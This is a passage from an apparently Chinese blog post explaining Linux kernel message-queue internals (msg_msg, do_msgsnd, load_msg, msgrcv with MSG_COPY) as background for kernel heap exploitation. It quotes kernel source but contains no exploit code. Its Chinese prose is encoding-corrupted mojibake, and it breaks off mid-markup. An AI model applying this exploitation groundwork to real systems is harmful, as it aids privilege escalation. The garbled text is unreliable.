<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span><span class="comment">//ä¸»æ¶ˆæ¯æ®µå¤´éƒ¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span> <span class="comment">//æ¶ˆæ¯åŒå‘é“¾è¡¨æŒ‡é’ˆ</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* æ¶ˆæ¯å¤§å° */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//æŒ‡å‘æ¶ˆæ¯ç¬¬äºŒæ®µ</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* åé¢æ¥ç€æ¶ˆæ¯çš„æ–‡æœ¬ */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span><span class="comment">//å­æ¶ˆæ¯æ®µå¤´éƒ¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//æŒ‡å‘ä¸‹ä¸€æ®µçš„æŒ‡é’ˆï¼Œæœ€å¤šä¸‰æ®µ</span></span><br><span class="line">	<span class="comment">/* åé¢æ¥ç€æ¶ˆæ¯ç¬¬äºŒ/ä¸‰æ®µçš„æ–‡æœ¬ */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸å’Œæ‰§è¡Œ<code>ksys_msgsnd()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°è°ƒç”¨<code>do_msgsnd()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype;</span><br><span class="line">	msg-&gt;m_ts = msgsz;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		<span class="comment">/* no one is waiting for this message, enqueue it */</span></span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages);</span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°é¦–å…ˆå¯¹msgtypeå’Œmsgszè¿›è¡Œäº†æ£€æŸ¥ï¼Œç„¶åè°ƒç”¨<code>load_msg(mtext, msgsz)</code>æ¥åˆå§‹åŒ–<code>msg_msg</code>ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šå…ˆè°ƒç”¨<code>alloc_msg</code>æ¥è¯·æ±‚msg_msgç»“æ„ä½“æ‰€éœ€è¦çš„ç©ºé—´.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸ªå‡½æ•°å¯ä»¥çœ‹å‡ºmsgç»“æ„ä½“æ˜¯å¯ä»¥æ‰©å……çš„ï¼Œå¯ä»¥ä»<code>0x40</code>æ‰©å……åˆ°<code>0x1000</code>,è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆmsg_msgåˆ©ç”¨çš„èŒƒå›´è¿™ä¹ˆå¹¿äº†ã€‚</p>
<p>è€Œä¸”å½“æ¶ˆæ¯é•¿åº¦è¶…è¿‡äº†<code>0x1000-0x30</code>è¿˜å¯ä»¥å§æ¶ˆæ¯è¿›è¡Œåˆ†æ®µï¼Œæœ€å¤šåˆ†ä¸‰æ®µï¼Œç»“æ„å›¾å¦‚ä¸‹ï¼Œæ‰€ä»¥ä¸€ä¸ªæ¶ˆæ¯çš„é•¿åº¦ç†è®ºä¸Šæœ€å¤šæ˜¯<code>0x3000-0x30-0x8-0x8</code></p>
<p><img src="https://img-blog.csdnimg.cn/3fcc181ebcc04b70b425a27f57ac166b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnJlZXplT19v,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å‡½æ•°ç”³è¯·å®Œæ‰€æœ‰ç©ºé—´å°±è¿”å›åˆ°<code>load_msg</code>å‡½æ•°ã€‚</p>
<p>ç„¶å<code>load_msg</code>æŠŠç”¨æˆ·ç©ºé—´çš„æ¶ˆæ¯å…¨éƒ¨å¤åˆ¶åˆ°åˆšç”³è¯·çš„msg_msgå’Œmsg_msgsegä¸Šï¼Œå°±è¿”å›åˆ°<code>do_msgsnd</code>å‡½æ•°ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯ç»è¿‡ä¸€å †æ£€æŸ¥ç„¶åæŠŠmsg_msgé“¾æ¥åˆ°å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­å»ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ç¤ºæ„å›¾å¦‚ä¸‹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/41f3e8fb8b054310ac6d3b18f6b13a4d.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h4 id="msgrcv"><a href="#msgrcv" class="headerlink" title="msgrcv()"></a>msgrcv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚æ•°msqidï¼šæŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—idï¼Œç”±msgget è¿”å›ã€‚<br>å‚æ•°msgpï¼šæ¥æ”¶æ¶ˆæ¯ç”¨çš„ç»“æ„ä½“æŒ‡é’ˆ<br>å‚æ•°msgszï¼šæ¥æ”¶æ¶ˆæ¯ç”¨çš„ç»“æ„ä½“å¤§å°<br>å‚æ•°msgtypï¼šä¸‰ç§æƒ…å†µï¼š<br>=0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªæ¶ˆæ¯</p>
<p>0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç±»å‹ä¸ºmsgtyp çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¦‚æœmsgflg è®¾ç½®äº†MSG_EXCEPT åˆ™ä¼šè¯»å–émsgtypç±»å‹çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼Œ è¿™ä¸ªæ¶ˆæ¯ç±»å‹åœ¨msgsnd é‡Œç”¨msgbuf ç»“æ„ä½“æŒ‡å®šçš„ï¼›å¦‚æœmsgflg è®¾ç½®äº†MSG_COPYåˆ™ä¼šè¯»å–é˜Ÿåˆ—ä¸­çš„ç¬¬msgtypä¸ªæ¶ˆæ¯ã€‚<br>&lt;0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­æœ€å°ç±»å‹ä¸”å°äºç­‰äºmsgtyp ç»å¯¹å€¼çš„æ¶ˆæ¯ã€‚<br>å‚æ•°msgflgï¼šé€šå¸¸ä½¿ç”¨ä¸‹é¢çš„ä¸€äº›flagï¼š<br>IPC_NOWAIT : æ¶ˆæ¯é˜Ÿåˆ—ä¸ºç©ºåˆ™ä¸ä¼šé˜»å¡ã€‚<br>MSG_EXCEPT : è·Ÿä¸Šé¢msgtyp è”ç”¨ï¼Œè¯»å–ç±»å‹ä¸æ˜¯msgtyp çš„ç¬¬ä¸€æ¡æ¶ˆæ¯ã€‚<br>MSG_NOERROR : æ¶ˆæ¯é•¿åº¦è¶…è¿‡msgsz æ—¶æˆªæ–­æ¶ˆæ¯ã€‚<br>MSG_COPY : æ¼æ´åˆ©ç”¨ä¸­ä¼šç”¨åˆ°ï¼Œå†…æ ¸ä¼šæŠŠæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯æ‹·è´ä¸€ä»½è¿”å›ç”¨æˆ·ç©ºé—´è€Œä¸ä¼šé‡Šæ”¾è¯¥æ¡æ¶ˆæ¯ç»“æ„ã€‚<br>è¿”å›å€¼ï¼šæˆåŠŸæ—¶è¿”å›è¯»å–çš„æ¶ˆæ¯å­—èŠ‚æ•°ï¼Œå¤±è´¥è¿”å›-1ã€‚</p>
</blockquote>
<p>å†…æ ¸ä¼šè°ƒç”¨<code>do_msgrcv()</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°å°±ä¼šæ ¹æ®msgtypeå’Œmsgflgæ¥æœç´¢åˆ°msg,ç„¶åæŠŠè¿™ä¸ªmsgæ‹·è´åˆ°ç”¨æˆ·ç©ºé—´çš„<code>buf</code>å¤„ï¼Œå½“msgflg!=<code>MSG_COPY</code>çš„æ—¶å€™ ï¼Œæ‰¾åˆ°msgåå°±ä¼šæŠŠè¿™ä¸ªmsgä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­unlink,ç„¶åæŠŠä¿¡æ¯å¤åˆ¶ç»™ç”¨æˆ·ç©ºé—´ï¼Œç„¶åå†freeè¿™ä¸ª<code>msg</code>ã€‚</p>
<p>ä½†æ˜¯å½“msgflg=<code>MSG_COPY</code>çš„æ—¶å€™ï¼Œä¼šå…ˆç”³è¯·ä¸€ä¸ªæ–°çš„msg,ç„¶ååœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ‰¾åˆ°ä¸€ä¸ªmsg,ç„¶åæŠŠè¿™ä¸ªmsgæ‹·è´åˆ°æ–°çš„msgä¸­ã€‚ç„¶åå†æŠŠæ–°çš„msgçš„å†…å®¹æ‹·è´åˆ°ç”¨æˆ·æ€ï¼Œæœ€åé‡Šæ”¾æ–°çš„<code>msg</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 